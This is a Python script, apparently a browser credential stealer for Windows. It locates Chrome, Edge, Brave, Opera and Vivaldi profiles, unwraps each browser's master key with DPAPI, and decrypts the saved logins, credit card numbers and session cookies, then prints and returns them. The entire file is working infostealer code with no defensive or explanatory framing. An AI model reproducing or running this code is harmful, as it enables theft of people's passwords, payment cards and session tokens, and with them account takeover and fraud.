import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil


def chrome_decrypt(payload, key):
    initialisation_vector = payload[3:15]  # Step 2: Extracting encrypted password from ciphertext
    encrypted_password = payload[15:-16]  # Step 3:Build the AES algorithm to decrypt the password
    cipher = AES.new(key, AES.MODE_GCM, initialisation_vector)
    decrypted_pass = cipher.decrypt(encrypted_password)
    decrypted_pass = decrypted_pass.decode()  # Step 4: Decrypted Password
    return decrypted_pass


def get_chrome_payment(directory, secret_key):
    cards = []
    shutil.copy2(os.path.join(directory, 'Web Data'), 'Web Data')
    conn = sqlite3.connect('Web Data')
    cursor = conn.cursor()
    cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
    for result in cursor.fetchall():
        if not result[0] or not result[1] or not result[2] or not result[3]:
            continue
        print('\nSaved Cards\n-----------------------------')
        print(f'Name: {result[0]}\nExpiration Date: {result[1]}/{result[2]}\nCard Number: {chrome_decrypt(result[3], secret_key)}')
        cards.append({"name": result[0], "expiration": f"{result[1]}/{result[2]}", "number": chrome_decrypt(result[3], secret_key)})
    print()
    conn.close()
    os.remove('./Web Data')
    return cards


def get_chrome_cookies(path, secret_key):
    cookies = []
    print('\nFlagged Cookies\n-----------------------------')
    keyterms = ['sess', 'key']
    shutil.copy2(os.path.join(path, 'Cookies'), 'Cookies')
    conn = sqlite3.connect("Cookies")
    cursor = conn.cursor()  # Select statement to retrieve info
    cursor.execute("select host_key, value, encrypted_value, name, path from cookies;")
    for index, cookie in enumerate(cursor.fetchall()):
        if not cookie[0] or not cookie[3] or not cookie[4]:
            continue
        url = cookie[0] + cookie[4]
        name = cookie[3]
        if cookie[1]:
            value = cookie[1]
        else:
            value = chrome_decrypt(cookie[2], secret_key)

        for term in keyterms:
            if term in value.lower() or term in name.lower():
                print(f"Url: {url}\nName: {name}\nValue: {value}\n")
                cookies.append({"url": url, "name": name, "value":value})
        # Step 1: Extracting initilisation vector from ciphertext
    conn.close()
    os.remove('Cookies')
    return cookies


def get_chrome_passwords(path, secret_key):
    print('\nPasswords\n-----------------------------')
    logins = []
    # Chrome username & password file path
    chrome_path_login_db = os.path.join(path, "Login Data")
    shutil.copy2(chrome_path_login_db, "Loginvault.db")  # Connect to sqlite database
    conn = sqlite3.connect("Loginvault.db")
    cursor = conn.cursor()  # Select statement to retrieve info
    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
    for index, login in enumerate(cursor.fetchall()):
        url = login[0]
        username = login[1]
        ciphertext = login[2]
        if not username:
            continue
        decrypted_pass = chrome_decrypt(ciphertext, secret_key)
        print(f'URL: {url}\nUsername: {username}\nPassword: {decrypted_pass}\n')
        logins.append({"url": url, "username": username, "password": decrypted_pass})
    conn.close()
    os.remove('./Loginvault.db')
    return logins


def get_master_key(path):
    try:
        # (1) Get secretkey from chrome local state
        with open(path, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        # Remove DPAPI prefix
        secret_key = secret_key[5:]
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key

    except Exception as e:
        # print(f"{e}")
        # print("[!] Key not found")
        return None


def get_chromium(base_path):
    data = {}
    if os.path.exists(os.path.join(base_path, "User Data")):
        base_path = os.path.join(base_path, "User Data")
    if os.path.exists(os.path.join(base_path, "Default")):
        profile_path = os.path.join(base_path, "Default")
    else:
        profile_path = base_path
    master_key = get_master_key(os.path.join(base_path, r"Local State"))
    if not master_key:
        return
    try:
        data['logins'] = get_chrome_passwords(profile_path, master_key)
    except:
        pass

    try:
        data['cards'] = get_chrome_payment(profile_path, master_key)
    except:
        pass
    try:
        data['cookies'] = get_chrome_cookies(os.path.join(profile_path, r"Network"), master_key)
    except Exception as e:
        pass
    if data:
        return data


def browser_grab():
    browser_output = {}
    browser_paths = {
        "Edge": r"%s\Microsoft\Edge" % (os.environ['LOCALAPPDATA']),
        "Chrome": r"%s\Google\Chrome" % (os.environ['LOCALAPPDATA']),
        "Brave": r"%s\BraveSoftware\Brave-Browser" % (os.environ['LOCALAPPDATA']),
        "Opera": r"%s\Opera Software\Opera Stable" % (os.environ['APPDATA']),
        "Opera GX": r"%s\Opera Software\Opera GX Stable" % (os.environ['APPDATA']),
        "Vivaldi": r"%s\Vivaldi" % (os.environ['APPDATA']),
    }
    for browser in browser_paths.keys():
        if os.path.exists(browser_paths[browser]):
            print(f"\n{browser}\n-----------------------------")
            browser_output[browser] = get_chromium(browser_paths[browser])
    return browser_output


if __name__ == '__main__':
    print(browser_grab())
    # master_key = get_master_key(os.path.normpath(r"%s\Microsoft\Edge\User Data\Local State"%(os.environ['LOCALAPPDATA'])))
    # get_chrome_cookies(r"%s\Microsoft\Edge\User Data\Default\Network" % (os.environ['LOCALAPPDATA']), master_key)
    # for i in get_chrome_passwords(r"%s\Microsoft\Edge\User Data\Default" % (os.environ['LOCALAPPDATA']), master_key):
    #     print(f'URL: {i.url}\nUsername: {i.username}\nPassword: {i.password}\n')